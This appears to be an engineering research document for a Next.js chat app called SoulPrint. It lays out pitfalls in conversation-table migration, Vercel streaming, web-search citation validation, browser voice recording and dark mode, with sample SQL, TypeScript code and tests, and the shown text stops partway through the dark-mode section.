# Pitfalls Research: Full Chat Experience Features

**Domain:** Adding multi-conversation, streaming, web search, voice input, dark mode, and rich rendering to existing chat app
**Researched:** 2026-02-08
**Confidence:** HIGH

**Context:** SoulPrint is a Next.js app on Vercel (serverless) with a Python RLM service on Render. Currently has single conversation, non-streaming responses, basic text rendering, light mode only. The `chat_messages` table has NO `conversation_id` column. The TelegramChatV2 component will need major refactoring.

---

## Critical Pitfalls

### Pitfall 1: Multi-Conversation Migration Without conversation_id Causing Data Loss

**What goes wrong:**
The `chat_messages` table currently has no `conversation_id` column. All existing messages belong to an implicit "default conversation". When you add multi-conversation support by altering the table to add `conversation_id` (nullable or with default value), you face: 1) All existing messages become orphaned or lumped into a single conversation, 2) Users lose conversation context/history, 3) Migration script fails on existing foreign key constraints, 4) Rollback becomes impossible after users create new conversations, 5) RLS policies break because they don't account for conversation-scoped access.

**Why it happens:**
Single-conversation apps often skip the conversation abstraction entirely, storing messages directly under user_id. When adding multi-conversation support, developers treat it as "just add a column" without considering: existing data semantics (what conversation do old messages belong to?), foreign key dependencies (conversations table must exist first), RLS policy updates (policies now need conversation_id checks), application code that queries without conversation_id (returns wrong results), and the impossibility of inferring conversation boundaries from timestamp gaps alone.

**Consequences:**
- All pre-migration messages show in wrong conversation or disappear entirely
- Users complain about "lost chat history" after update
- Cannot roll back migration safely (data already corrupted)
- New conversation creation works, but message retrieval broken
- Emergency hotfix required, downtime extends
- User trust in product collapses ("my data disappeared")

**Prevention:**

**Strategy 1: Conversation Inference Migration**
```sql
-- Step 1: Create conversations table
CREATE TABLE IF NOT EXISTS conversations (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  title TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_conversations_user ON conversations(user_id, updated_at DESC);

-- Step 2: Create default conversation for each user with existing messages
INSERT INTO conversations (id, user_id, title, created_at)
SELECT
  gen_random_uuid() as id,
  user_id,
  'Conversation History' as title,
  MIN(created_at) as created_at
FROM chat_messages
GROUP BY user_id;

-- Step 3: Add conversation_id column (nullable initially)
ALTER TABLE chat_messages
ADD COLUMN conversation_id UUID REFERENCES conversations(id) ON DELETE CASCADE;

-- Step 4: Backfill conversation_id for existing messages
UPDATE chat_messages cm
SET conversation_id = (
  SELECT c.id
  FROM conversations c
  WHERE c.user_id = cm.user_id
  LIMIT 1
);

-- Step 5: Make conversation_id NOT NULL after backfill
ALTER TABLE chat_messages
ALTER COLUMN conversation_id SET NOT NULL;

-- Step 6: Update index to include conversation_id
CREATE INDEX idx_chat_messages_conversation
ON chat_messages(conversation_id, created_at DESC);
```

**Strategy 2: Application-Level Conversation Grouping**
```typescript
// lib/conversations/migration-helper.ts
export async function inferConversationsFromMessages(
  userId: string
): Promise<ConversationGroup[]> {
  // Fetch all user messages ordered by time
  const { data: messages } = await supabase
    .from('chat_messages')
    .select('*')
    .eq('user_id', userId)
    .order('created_at', { ascending: true });

  if (!messages || messages.length === 0) return [];

  // Group messages by time gaps (>2 hours = new conversation)
  const GAP_THRESHOLD_MS = 2 * 60 * 60 * 1000; // 2 hours
  const groups: ConversationGroup[] = [];
  let currentGroup: Message[] = [messages[0]];

  for (let i = 1; i < messages.length; i++) {
    const prevTime = new Date(messages[i - 1].created_at).getTime();
    const currTime = new Date(messages[i].created_at).getTime();
    const gap = currTime - prevTime;

    if (gap > GAP_THRESHOLD_MS) {
      // Save current group and start new one
      groups.push({
        messages: currentGroup,
        title: inferConversationTitle(currentGroup),
        created_at: currentGroup[0].created_at
      });
      currentGroup = [messages[i]];
    } else {
      currentGroup.push(messages[i]);
    }
  }

  // Don't forget last group
  if (currentGroup.length > 0) {
    groups.push({
      messages: currentGroup,
      title: inferConversationTitle(currentGroup),
      created_at: currentGroup[0].created_at
    });
  }

  return groups;
}

function inferConversationTitle(messages: Message[]): string {
  // Use first user message as title (truncated)
  const firstUserMsg = messages.find(m => m.role === 'user');
  if (firstUserMsg) {
    return firstUserMsg.content.slice(0, 50).trim() + '...';
  }
  return 'Untitled Conversation';
}
```

**Strategy 3: Zero-Downtime Migration with Dual-Write**
```typescript
// Phase 1: Add conversation_id column (nullable)
// Phase 2: Deploy app code that dual-writes (with and without conversation_id)
export async function saveMessage(
  role: 'user' | 'assistant',
  content: string,
  conversationId?: string
) {
  // Dual write: save with conversation_id if provided, without if not
  const messageData: any = {
    user_id: userId,
    role,
    content,
    created_at: new Date().toISOString()
  };

  if (conversationId) {
    messageData.conversation_id = conversationId;
  }

  await supabase.from('chat_messages').insert(messageData);
}

// Phase 3: Background job backfills conversation_id for old messages
// Phase 4: After 100% backfill, make conversation_id NOT NULL
// Phase 5: Remove dual-write logic
```

**Strategy 4: Testing Conversation Migration**
```typescript
// tests/migration/conversation-migration.test.ts
describe('Conversation Migration', () => {
  test('preserves all existing messages', async () => {
    // Seed database with 100 messages across 5 users
    const beforeCount = await countMessages();

    // Run migration
    await runConversationMigration();

    // Verify no message loss
    const afterCount = await countMessages();
    expect(afterCount).toBe(beforeCount);
  });

  test('assigns existing messages to default conversation', async () => {
    const userId = 'test-user-123';

    // Create 10 messages for user (no conversation_id)
    await seedMessages(userId, 10);

    // Run migration
    await runConversationMigration();

    // Verify all messages now have conversation_id
    const { data: messages } = await supabase
      .from('chat_messages')
      .select('conversation_id')
      .eq('user_id', userId);

    expect(messages?.every(m => m.conversation_id !== null)).toBe(true);

    // Verify all messages in same conversation
    const uniqueConvIds = new Set(messages?.map(m => m.conversation_id));
    expect(uniqueConvIds.size).toBe(1);
  });

  test('RLS policies work after migration', async () => {
    const userId1 = 'user-1';
    const userId2 = 'user-2';

    // Seed messages for both users
    await seedMessages(userId1, 5);
    await seedMessages(userId2, 5);

    // Run migration
    await runConversationMigration();

    // Verify user1 can only see their messages
    const { data: user1Messages } = await supabase
      .from('chat_messages')
      .select('*')
      .eq('user_id', userId1);

    expect(user1Messages?.length).toBe(5);
    expect(user1Messages?.every(m => m.user_id === userId1)).toBe(true);
  });
});
```

**Warning signs:**
- `chat_messages` table has no `conversation_id` column
- No `conversations` table exists yet
- Application code queries messages without conversation scoping
- No migration plan for existing message data
- RLS policies don't check conversation_id

**Phase to address:**
Phase 1: Database Schema Migration - MUST complete before UI changes

**Sources:**
- [How to Design a Database Schema for a Real-Time Chat & Messaging App?](https://www.back4app.com/tutorials/how-to-design-a-database-schema-for-a-real-time-chat-and-messaging-app)
- [Unified Chat History and Logging System: A Comprehensive Approach to AI Conversation Management](https://medium.com/@mbonsign/unified-chat-history-and-logging-system-a-comprehensive-approach-to-ai-conversation-management-dc3b5d75499f)

---

### Pitfall 2: Streaming Through Vercel Serverless Buffering Everything

**What goes wrong:**
You convert `/app/api/chat/route.ts` to return a streaming response with `ReadableStream` and Server-Sent Events (SSE). In local dev, chunks stream perfectly as they're generated. You deploy to Vercel and discover: 1) Chunks don't arrive incrementally, client receives all chunks at once after full completion, 2) Long responses timeout at 60 seconds (Pro plan) or 10 seconds (Hobby) before streaming finishes, 3) Next.js waits for the entire route handler to complete before sending Response, buffering everything in memory, 4) Client shows loading spinner for 30+ seconds then all text appears instantly (no progressive rendering).

**Why it happens:**
Next.js Pages Router API routes buffer responses by default. Even with streaming APIs, if you run an `async for await` loop that processes chunks before returning the Response, Next.js buffers until the handler finishes. Vercel's serverless functions have hard timeout limits (10s Hobby, 60s Pro, 900s Enterprise) and aren't designed for long-lived connections. Without explicit runtime configuration (`export const runtime = 'nodejs'` and `export const dynamic = 'force-dynamic'`), Next.js statically optimizes routes and caches responses, breaking streaming. The buffering happens at multiple layers: Next.js runtime, Vercel Edge Network, and client fetch() implementation.

**Consequences:**
- Streaming appears to work in dev, fails in production (environment-specific bug)
- Users see no feedback during long responses (bad UX)
- Responses timeout mid-stream on Hobby/Pro plans
- Memory usage spikes as entire response buffered in serverless function
- Client receives "Error: Failed to fetch" instead of partial response
- Cannot stream responses longer than serverless timeout limit

**Prevention:**

**Strategy 1: Correct Streaming Configuration**
```typescript
// app/api/chat/route.ts
import { NextRequest } from 'next/server';

// CRITICAL: These exports enable true streaming
export const runtime = 'nodejs'; // Required for streaming
export const dynamic = 'force-dynamic'; // Prevent static optimization
export const maxDuration = 60; // Max duration in seconds (Pro plan)

export async function POST(request: NextRequest) {
  const { message, history } = await request.json();

  // Create ReadableStream that yields chunks as they're generated
  const stream = new ReadableStream({
    async start(controller) {
      try {
        // Call LLM with streaming enabled
        const response = await fetch(RLM_URL + '/query', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message, history, stream: true })
        });

        if (!response.body) throw new Error('No response body');

        const reader = response.body.getReader();
        const decoder = new TextDecoder();

        while (true) {
          const { done, value } = await reader.read();
          if (done) break;

          const chunk = decoder.decode(value);
          const lines = chunk.split('\n');

          for (const line of lines) {
            if (line.startsWith('data: ')) {
              const data = line.slice(6);
              if (data === '[DONE]') continue;

              try {
                const parsed = JSON.parse(data);
                // Immediately enqueue chunk (don't buffer)
                controller.enqueue(
                  new TextEncoder().encode(`data: ${JSON.stringify(parsed)}\n\n`)
                );
              } catch (e) {
                // Malformed JSON, skip
              }
            }
          }
        }

        controller.close();
      } catch (error) {
        controller.error(error);
      }
    }
  });

  // Return Response immediately with stream (don't await completion)
  return new Response(stream, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache, no-transform',
      'Connection': 'keep-alive',
    }
  });
}
```

**Strategy 2: Client-Side Stream Handling**
```typescript
// Client must properly handle SSE streams
async function sendMessage(content: string) {
  const response = await fetch('/api/chat', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: content, history })
  });

  if (!response.ok) throw new Error('Chat request failed');
  if (!response.body) throw new Error('No response body');

  const reader = response.body.getReader();
  const decoder = new TextDecoder();

  let responseContent = '';
  const aiMessageId = Date.now().toString();

  // Add empty AI message immediately
  setMessages(prev => [...prev, {
    id: aiMessageId,
    role: 'assistant',
    content: '',
    timestamp: new Date()
  }]);

  try {
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      const chunk = decoder.decode(value);
      const lines = chunk.split('\n');

      for (const line of lines) {
        if (line.startsWith('data: ')) {
          const data = line.slice(6);
          if (data === '[DONE]') continue;

          try {
            const parsed = JSON.parse(data);
            if (parsed.content) {
              responseContent += parsed.content;

              // Update message incrementally (progressive rendering)
              setMessages(prev =>
                prev.map(m =>
                  m.id === aiMessageId
                    ? { ...m, content: responseContent }
                    : m
                )
              );
            }
          } catch (e) {
            // Skip malformed JSON
          }
        }
      }
    }
  } catch (error) {
    console.error('Stream error:', error);
    // Show error message in UI
    setMessages(prev =>
      prev.map(m =>
        m.id === aiMessageId
          ? { ...m, content: responseContent || 'Error: Stream interrupted' }
          : m
      )
    );
  }
}
```

**Strategy 3: Fallback for Timeout Protection**
```typescript
// Implement timeout detection and graceful degradation
export async function POST(request: NextRequest) {
  const startTime = Date.now();
  const MAX_DURATION_MS = 55000; // 55s (leave 5s buffer)

  const stream = new ReadableStream({
    async start(controller) {
      try {
        const response = await fetch(RLM_URL + '/query', {
          method: 'POST',
          body: JSON.stringify({ message, history, stream: true })
        });

        const reader = response.body!.getReader();
        const decoder = new TextDecoder();

        while (true) {
          // Check if approaching timeout
          if (Date.now() - startTime > MAX_DURATION_MS) {
            console.warn('Approaching serverless timeout, closing stream');
            controller.enqueue(
              new TextEncoder().encode(
                `data: ${JSON.stringify({
                  content: '\n\n[Response truncated due to length]'
                })}\n\n`
              )
            );
            controller.close();
            break;
          }

          const { done, value } = await reader.read();
          if (done) break;

          // ... process chunks ...
        }
      } catch (error) {
        controller.error(error);
      }
    }
  });

  return new Response(stream, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache, no-transform'
    }
  });
}
```

**Strategy 4: Testing Streaming in Production-Like Environment**
```typescript
// tests/streaming/vercel-streaming.test.ts
describe('Streaming on Vercel', () => {
  test('chunks arrive incrementally, not buffered', async () => {
    const chunkTimes: number[] = [];
    const startTime = Date.now();

    const response = await fetch('/api/chat', {
      method: 'POST',
      body: JSON.stringify({ message: 'Generate a long response' })
    });

    const reader = response.body!.getReader();
    const decoder = new TextDecoder();

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      chunkTimes.push(Date.now() - startTime);
      const chunk = decoder.decode(value);
      // Chunk received
    }

    // Verify chunks arrived progressively (not all at once)
    expect(chunkTimes.length).toBeGreaterThan(5);
    expect(chunkTimes[1] - chunkTimes[0]).toBeLessThan(5000); // <5s between chunks

    // Verify not buffered (first chunk arrives early)
    expect(chunkTimes[0]).toBeLessThan(3000); // First chunk within 3s
  });

  test('handles timeout gracefully', async () => {
    // Mock LLM that streams for 70 seconds (exceeds 60s limit)
    const response = await fetch('/api/chat', {
      method: 'POST',
      body: JSON.stringify({ message: 'Generate 70s response' })
    });

    const reader = response.body!.getReader();
    let receivedTruncationMessage = false;

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      const chunk = new TextDecoder().decode(value);
      if (chunk.includes('truncated due to length')) {
        receivedTruncationMessage = true;
      }
    }

    expect(receivedTruncationMessage).toBe(true);
  });
});
```

**Warning signs:**
- Streaming works in `npm run dev` but fails in production
- No `export const runtime = 'nodejs'` in route file
- Responses buffered (all text appears at once)
- Timeouts on long responses in production
- No timeout detection/handling logic

**Phase to address:**
Phase 2: Streaming Implementation - Test in Vercel preview environment before main branch

**Sources:**
- [Fixing Slow SSE (Server-Sent Events) Streaming in Next.js and Vercel](https://medium.com/@oyetoketoby80/fixing-slow-sse-server-sent-events-streaming-in-next-js-and-vercel-99f42fbdb996)
- [Vercel Functions Limits](https://vercel.com/docs/functions/limitations)
- [Next.js App Router: Streaming](https://nextjs.org/learn/dashboard-app/streaming)

---

### Pitfall 3: Web Search Citation Hallucinations and URL Fabrication

**What goes wrong:**
You integrate Perplexity or Tavily Search API for web search in chat. The LLM receives search results with URLs and summaries. When the LLM generates a response, it: 1) Cites URLs that were NOT in the search results (fabricated links), 2) Misattributes information to wrong sources, 3) Provides outdated URLs (redirects or 404s), 4) Synthesizes facts not present in any search result, 5) Ignores search results entirely and hallucinates anyway. User clicks citation, gets 404 or unrelated page, loses trust in product accuracy.

**Why it happens:**
LLMs trained on internet text "know" URLs and website patterns. Even when provided real search results, the model's training causes it to generate plausible-but-fake URLs. Search result summaries are paraphrased by the search API, creating information loss. The LLM fills gaps with training data instead of admitting uncertainty. Citation validation is post-hoc (after generation), not during generation. No mechanism forces the LLM to quote search results verbatim. The prompt doesn't explicitly forbid hallucinating URLs. No detection of citation accuracy in testing.

**Consequences:**
- Users click citations, find wrong/missing content
- Trust in "web search" feature collapses
- Legal liability if incorrect info cited to real sources
- User screenshots fake citations, damages brand reputation
- Cannot distinguish real citations from hallucinated ones
- Feature becomes liability, not asset

**Prevention:**

**Strategy 1: Structured Citation Format**
```typescript
// lib/search/citation-enforcer.ts
interface SearchResult {
  url: string;
  title: string;
  snippet: string;
  source_id: string; // e.g., "SOURCE_1"
}

function buildSearchPrompt(
  userQuery: string,
  searchResults: SearchResult[]
): string {
  // Assign each result a unique ID for citation tracking
  const sourcesSection = searchResults
    .map((result, idx) => {
      const sourceId = `SOURCE_${idx + 1}`;
      return `[${sourceId}] ${result.title}
URL: ${result.url}
${result.snippet}
`;
    })
    .join('\n\n');

  return `You are answering a question with web search results.

USER QUESTION: ${userQuery}

WEB SEARCH RESULTS:
${sourcesSection}

CITATION RULES:
1. You MUST cite sources using [SOURCE_X] format
2. You CANNOT cite URLs not listed above
3. If information isn't in search results, say "I don't have current information on this"
4. NEVER fabricate URLs or source IDs
5. Include [SOURCE_X] inline after each claim

Answer the question using ONLY the search results above:`;
}

// Validate citations in response
function validateCitations(
  response: string,
  searchResults: SearchResult[]
): { valid: boolean; violations: string[] } {
  const violations: string[] = [];

  // Extract all citations from response
  const citationPattern = /\[SOURCE_(\d+)\]/g;
  const citations = [...response.matchAll(citationPattern)];

  for (const match of citations) {
    const sourceNum = parseInt(match[1]);
    if (sourceNum < 1 || sourceNum > searchResults.length) {
      violations.push(`Invalid citation [SOURCE_${sourceNum}] - no such source exists`);
    }
  }

  // Extract all URLs from response
  const urlPattern = /https?:\/\/[^\s)]+/g;
  const urls = [...response.matchAll(urlPattern)];
  const validUrls = new Set(searchResults.map(r => r.url));

  for (const match of urls) {
    const url = match[0];
    if (!validUrls.has(url)) {
      violations.push(`Hallucinated URL: ${url} (not in search results)`);
    }
  }

  return {
    valid: violations.length === 0,
    violations
  };
}

// Post-process response to add real URLs
function hydrateCitations(
  response: string,
  searchResults: SearchResult[]
): string {
  // Replace [SOURCE_X] with inline links
  return response.replace(/\[SOURCE_(\d+)\]/g, (match, num) => {
    const idx = parseInt(num) - 1;
    if (idx >= 0 && idx < searchResults.length) {
      const result = searchResults[idx];
      return `[${result.title}](${result.url})`;
    }
    return match; // Leave unchanged if invalid
  });
}
```

**Strategy 2: Citation Verification Before Display**
```typescript
// app/api/chat/route.ts (web search path)
export async function POST(request: NextRequest) {
  const { message, deepSearch } = await request.json();

  if (deepSearch) {
    // 1. Fetch search results
    const searchResults = await tavily.search({
      query: message,
      search_depth: 'advanced',
      max_results: 5
    });

    // 2. Build prompt with structured sources
    const prompt = buildSearchPrompt(message, searchResults);

    // 3. Generate response
    const response = await llm.generate(prompt);

    // 4. Validate citations BEFORE streaming to user
    const validation = validateCitations(response, searchResults);

    if (!validation.valid) {
      log.error({
        violations: validation.violations,
        response: response.slice(0, 500)
      }, 'Citation hallucination detected');

      // Fallback: strip hallucinated URLs, add disclaimer
      response = stripInvalidCitations(response, searchResults);
      response += '\n\n⚠️ Some citations were removed due to verification issues.';
    }

    // 5. Hydrate [SOURCE_X] with real URLs
    const finalResponse = hydrateCitations(response, searchResults);

    return Response.json({ content: finalResponse });
  }

  // Regular chat flow...
}
```

**Strategy 3: Search Result Grounding**
```typescript
// Force LLM to quote search results verbatim
function buildGroundedSearchPrompt(
  query: string,
  results: SearchResult[]
): string {
  return `You are a research assistant. Answer ONLY using direct quotes from the search results below.

RULES:
1. Start each fact with a direct quote: "According to [SOURCE_X], '[exact quote]'"
2. Do NOT paraphrase - use exact text from snippets
3. If answer not in search results, say "The search results don't contain information about this"
4. NEVER add information from your training data

USER QUESTION: ${query}

SEARCH RESULTS:
${results.map((r, i) => `[SOURCE_${i+1}] ${r.title}\n${r.snippet}`).join('\n\n')}

Answer using direct quotes:`;
}
```

**Strategy 4: Citation Testing**
```typescript
// tests/search/citation-accuracy.test.ts
describe('Web Search Citations', () => {
  test('LLM does not hallucinate URLs', async () => {
    const mockResults = [
      {
        url: 'https://example.com/real-article',
        title: 'Real Article',
        snippet: 'This is a real snippet about cats.',
        source_id: 'SOURCE_1'
      }
    ];

    const response = await generateSearchResponse(
      'Tell me about cats',
      mockResults
    );

    // Extract all URLs from response
    const urls = extractUrls(response);

    // Verify no hallucinated URLs
    for (const url of urls) {
      const isValid = mockResults.some(r => r.url === url);
      expect(isValid).toBe(true);
    }
  });

  test('citations match search result content', async () => {
    const mockResults = [
      {
        url: 'https://cats.com/facts',
        title: 'Cat Facts',
        snippet: 'Cats sleep 16 hours per day.',
        source_id: 'SOURCE_1'
      }
    ];

    const response = await generateSearchResponse(
      'How long do cats sleep?',
      mockResults
    );

    // Verify response cites SOURCE_1
    expect(response).toMatch(/\[SOURCE_1\]/);

    // Verify response doesn't cite non-existent sources
    expect(response).not.toMatch(/\[SOURCE_2\]/);
    expect(response).not.toMatch(/\[SOURCE_3\]/);
  });

  test('warns when citations removed', async () => {
    // Mock LLM that hallucinates URLs
    jest.spyOn(llm, 'generate').mockResolvedValue(
      'According to https://fake-url.com, cats are great. [SOURCE_5]'
    );

    const response = await generateSearchResponse('Tell me about cats', []);

    expect(response).toContain('citations were removed');
  });
});
```

**Warning signs:**
- No citation validation before displaying to user
- LLM prompt doesn't forbid URL fabrication
- Search results passed to LLM without structured IDs
- No post-generation check that [SOURCE_X] exists
- Users report "citation leads to wrong page"

**Phase to address:**
Phase 3: Web Search Integration - Implement citation validation before GA launch

**Sources:**
- [Tools that merge search functions with generative text, like ChatGPT and Perplexity, still struggle with citation integrity and accuracy](https://wacclearinghouse.org/repository/collections/continuing-experiments/august-2025/ai-literacy/understanding-avoiding-hallucinated-references/)
- [GPTZero uncovers 50+ Hallucinations in ICLR 2026](https://gptzero.me/news/iclr-2026/)
- [AI Showdown: Comparative Analysis of AI Models on Hallucination, Bias, and Accuracy](https://shiftasia.com/column/comparative-analysis-of-ai-models-on-hallucination-bias-and-accuracy/)

---

### Pitfall 4: Voice Input Browser Compatibility and Transcription Cost Runaway

**What goes wrong:**
You implement voice input using Web Audio API and OpenAI Whisper transcription. Works perfectly on Chrome desktop. Then you discover: 1) Safari and Firefox reject microphone permissions differently, 2) Mobile browsers (especially iOS Safari) require user gesture for `getUserMedia()`, 3) MediaRecorder MIME types differ (webm, mp4, ogg) across browsers, 4) Voice recordings fail silently without error handling, 5) Transcription costs spiral as users record 5-minute voice notes ($0.006/min adds up), 6) No voice activity detection - users forget to stop recording.

**Why it happens:**
Web Audio API has 92% browser compatibility but subtle differences break implementations. iOS Safari aggressively restricts media access (privacy features). MediaRecorder API support varies: Chrome supports webm, Safari prefers mp4, Firefox uses ogg. Developers test on one browser, assume it works everywhere. Whisper API costs $0.006/minute - seems cheap until you have 1000 users recording 100 messages/month = $600/month. No cost ceiling or duration limits on recordings. Users expect unlimited recording (like voice memos), developers expect short queries.

**Consequences:**
- Voice input broken on Safari/Firefox (50% of mobile users)
- Support tickets: "Microphone doesn't work"
- Transcription costs exceed revenue, unsustainable unit economics
- Users accidentally record 10-minute conversations, drive up costs
- Silent failures: button turns red but nothing happens
- Transcription latency (5-10s for long recordings) feels broken

**Prevention:**

**Strategy 1: Cross-Browser MediaRecorder Handling**
```typescript
// lib/voice/recorder.ts
interface RecordingConfig {
  mimeType: string;
  audioBitsPerSecond: number;
}

function selectRecorderConfig(): RecordingConfig {
  // Try formats in order of quality/compatibility
  const formats = [
    { mimeType: 'audio/webm;codecs=opus', bps: 128000 },
    { mimeType: 'audio/webm', bps: 128000 },
    { mimeType: 'audio/mp4', bps: 128000 },
    { mimeType: 'audio/ogg;codecs=opus', bps: 128000 },
    { mimeType: '', bps: 128000 } // Let browser choose
  ];

  for (const format of formats) {
    if (format.mimeType === '' || MediaRecorder.isTypeSupported(format.mimeType)) {
      console.log('Selected recording format:', format.mimeType || 'browser default');
      return format;
    }
  }

  throw new Error('No supported audio recording format found');
}

export async function startRecording(): Promise<MediaRecorder> {
  try {
    // Request microphone access
    const stream = await navigator.mediaDevices.getUserMedia({
      audio: {
        echoCancellation: true,
        noiseSuppression: true,
        sampleRate: 16000 // Whisper prefers 16kHz
      }
    });

    // Select compatible MIME type
    const config = selectRecorderConfig();
    const options = config.mimeType ? {
      mimeType: config.mimeType,
      audioBitsPerSecond: config.audioBitsPerSecond
    } : undefined;

    const mediaRecorder = new MediaRecorder(stream, options);

    return mediaRecorder;
  } catch (error) {
    if (error instanceof DOMException) {
      if (error.name === 'NotAllowedError') {
        throw new Error('Microphone access denied. Please allow microphone access in browser settings.');
      } else if (error.name === 'NotFoundError') {
        throw new Error('No microphone detected. Please connect a microphone and try again.');
      } else if (error.name === 'NotReadableError') {
        throw new Error('Microphone is in use by another application.');
      }
    }
    throw new Error('Failed to start recording: ' + (error as Error).message);
  }
}

// iOS Safari requires user gesture to request permissions
export function requiresUserGesture(): boolean {
  return /iPhone|iPad|iPod/.test(navigator.userAgent);
}
```

**Strategy 2: Recording Duration Limits and Cost Control**
```typescript
// lib/voice/transcription-limits.ts
const MAX_RECORDING_DURATION_MS = 2 * 60 * 1000; // 2 minutes
const MAX_FILE_SIZE_MB = 10; // 10MB limit
const WHISPER_COST_PER_MINUTE = 0.006; // $0.006/min

export async function transcribeWithLimits(
  audioBlob: Blob,
  durationMs: number
): Promise<{ text: string; cost: number }> {

  // Enforce duration limit
  if (durationMs > MAX_RECORDING_DURATION_MS) {
    throw new Error(`Recording too long (max ${MAX_RECORDING_DURATION_MS / 60000} minutes)`);
  }

  // Enforce file size limit
  const sizeMB = audioBlob.size / (1024 * 1024);
  if (sizeMB > MAX_FILE_SIZE_MB) {
    throw new Error(`Recording too large (max ${MAX_FILE_SIZE_MB}MB)`);
  }

  // Calculate cost
  const durationMin = durationMs / 60000;
  const estimatedCost = durationMin * WHISPER_COST_PER_MINUTE;

  log.info({
    duration_seconds: durationMs / 1000,
    size_mb: sizeMB.toFixed(2),
    estimated_cost_usd: estimatedCost.toFixed(4)
  }, 'Transcribing audio');

  // Transcribe with OpenAI Whisper
  const formData = new FormData();
  formData.append('file', audioBlob, 'audio.webm');
  formData.append('model', 'whisper-1');
  formData.append('language', 'en'); // Specify language for better accuracy

  const response = await fetch('https://api.openai.com/v1/audio/transcriptions', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${process.env.OPENAI_API_KEY}`
    },
    body: formData
  });

  if (!response.ok) {
    throw new Error(`Transcription failed: ${response.statusText}`);
  }

  const { text } = await response.json();

  // Track cost metrics
  await trackTranscriptionCost(estimatedCost, durationMs);

  return { text, cost: estimatedCost };
}

// Auto-stop recording after duration limit
export function createRecorderWithTimeout(
  mediaRecorder: MediaRecorder,
  maxDurationMs: number,
  onTimeout: () => void
): { recorder: MediaRecorder; cancel: () => void } {

  const timeoutId = setTimeout(() => {
    if (mediaRecorder.state === 'recording') {
      console.warn('Recording auto-stopped due to duration limit');
      mediaRecorder.stop();
      onTimeout();
    }
  }, maxDurationMs);

  mediaRecorder.addEventListener('stop', () => {
    clearTimeout(timeoutId);
  });

  return {
    recorder: mediaRecorder,
    cancel: () => clearTimeout(timeoutId)
  };
}
```

**Strategy 3: User Feedback for Recording State**
```typescript
// components/chat/VoiceRecordButton.tsx
export function VoiceRecordButton({ onTranscription }: Props) {
  const [state, setState] = useState<'idle' | 'recording' | 'transcribing'>('idle');
  const [duration, setDuration] = useState(0);
  const [error, setError] = useState<string | null>(null);
  const maxDuration = 120; // 2 minutes

  async function startRecording() {
    try {
      const recorder = await startRecording();
      const { recorder: timedRecorder, cancel } = createRecorderWithTimeout(
        recorder,
        maxDuration * 1000,
        () => {
          setError('Recording auto-stopped (2 minute limit)');
          handleStopRecording();
        }
      );

      setState('recording');

      // Update duration every second
      const interval = setInterval(() => {
        setDuration(prev => prev + 1);
      }, 1000);

      recorder.addEventListener('stop', () => {
        clearInterval(interval);
        cancel();
      });

    } catch (error) {
      setError((error as Error).message);
    }
  }

  return (
    <div>
      <button
        onClick={state === 'idle' ? startRecording : handleStopRecording}
        disabled={state === 'transcribing'}
        className={cn(
          'w-11 h-11 rounded-full flex items-center justify-center',
          state === 'recording' && 'animate-pulse bg-red-500',
          state === 'transcribing' && 'cursor-not-allowed opacity-50'
        )}
      >
        {state === 'transcribing' ? (
          <Loader className="w-5 h-5 animate-spin" />
        ) : (
          <Mic className="w-6 h-6" />
        )}
      </button>

      {state === 'recording' && (
        <div className="text-xs text-red-500 mt-1">
          Recording: {duration}s / {maxDuration}s
        </div>
      )}

      {error && (
        <div className="text-xs text-red-500 mt-1">
          {error}
        </div>
      )}
    </div>
  );
}
```

**Strategy 4: Testing Across Browsers**
```typescript
// tests/voice/cross-browser.test.ts
describe('Voice Recording Cross-Browser', () => {
  const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge'];

  for (const browser of browsers) {
    test(`records audio on ${browser}`, async () => {
      // Use Playwright to test in actual browsers
      const browserContext = await playwright[browser.toLowerCase()].launch();
      const page = await browserContext.newPage();

      // Grant microphone permissions
      await page.context().grantPermissions(['microphone']);

      await page.goto('http://localhost:3000/chat');

      // Click voice button
      await page.click('[data-testid="voice-record-button"]');

      // Wait for recording state
      await page.waitForSelector('[data-testid="recording-indicator"]');

      // Stop recording after 2 seconds
      await page.waitForTimeout(2000);
      await page.click('[data-testid="voice-record-button"]');

      // Verify transcription appears
      const transcription = await page.waitForSelector('[data-testid="transcribed-text"]');
      expect(await transcription.textContent()).toBeTruthy();
    });
  }
});
```

**Warning signs:**
- Voice recording only tested on Chrome
- No MIME type compatibility check
- No recording duration limits
- No cost tracking/alerting for transcription
- Permission errors not handled gracefully

**Phase to address:**
Phase 4: Voice Input - Test on iOS Safari before release

**Sources:**
- [Web Audio API | Can I use... Support tables](https://caniuse.com/audio-api)
- [Cross Browser Compatibility Score of Web Audio API](https://www.lambdatest.com/web-technologies/audio-api)
- [Whisper API Pricing 2026: $0.006/min Real Cost Breakdown](https://brasstranscripts.com/blog/openai-whisper-api-pricing-2025-self-hosted-vs-managed)

---

### Pitfall 5: Dark Mode CSS Variables Causing Invisible Text on Theme Toggle

**What goes wrong:**
You add dark mode by toggling a `.dark` class and swapping CSS variables. Works great in development. Then users report: 1) After theme toggle, text disappears (white on white or black on black), 2) Some components respect theme, others don't (inconsistent styling), 3) Third-party components (react-markdown, syntax highlighter) break in dark mode, 4) Hard-coded color values in inline styles override theme, 5) Browser's `prefers-color-scheme` conflicts with manual toggle, 6) Flash of wrong theme on page load (FOIT - Flash of Incorrect Theme).

**Why it happens:**
Existing light-mode app has hard-coded colors scattered throughout: `text-gray-900`, `bg-white`, inline styles `style={{ color: '#000' }}`. Adding dark mode theme only affects components using CSS variables - hard-coded values ignore theme entirely. Third-party libraries don't know about your design tokens. Developers test dark mode by toggling manually, miss the default-theme-on-load issue. No systematic audit of color usage. Pure black (`#000000`) backgrounds hurt eyes in dark mode despite looking clean in mockups.

**Consequences:**
- Text invisible in parts of UI after theme toggle
- Users forced to reload page to fix rendering
- Dark mode feels broken, users revert to light mode
